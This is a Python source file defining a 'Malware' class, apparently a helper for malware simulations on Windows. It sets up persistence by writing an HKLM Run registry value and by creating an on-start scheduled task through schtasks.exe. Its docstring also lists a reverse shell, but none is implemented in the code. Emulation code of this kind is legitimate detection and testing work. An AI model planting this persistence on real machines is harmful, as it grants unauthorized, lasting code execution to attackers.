import random
import string
import winreg
import datetime
import subprocess
from win32com.taskscheduler import taskscheduler



class Malware(object):
    """A generic malware class that provides helper functions
    that will probably be shared by mutliple simulations. 
    
    Provides:
        1. Registry key creation
        2. Schedule task creation
        3. Reverse Shell

    Attributes:
        path `str` : The path where the malware drops itself.
        name `str` : The name of the executable.
    
    """

    def __init__(self, path):
        self.path = path
        self.name = self.path.split("\\")[-1]

    def random_string(self):
        """Generate a random alphanumeric string of variable length"""
        return ''.join(
            random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits
        ) for _ in range(random.randint(8,24)))

    
    def create_registry_key(self, key, value,
                            path=r'Software\Microsoft\Windows\CurrentVersion\Run',
                            hive=winreg.HKEY_LOCAL_MACHINE):
        """
        Creates the persistance registry key with the specific value at the path

        :param key: The key name
        :param value: The value name
        :param path: The path to registry key. Default is CurrentVersion Run
        :param hive: Which hive this key belongs to.
        """

        reg_key = winreg.OpenKey(
            hive, path, 0, winreg.KEY_SET_VALUE)

        with reg_key:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)

    def create_scheduled_task(self, name, file, freq_cmd="onstart"):
        cmd = ["schtasks.exe", "/create", "/sc"] + freq_cmd.split(" ")
        cmd += ["/tn", name, "/TR", file]
        subprocess.Popen(
            cmd
        )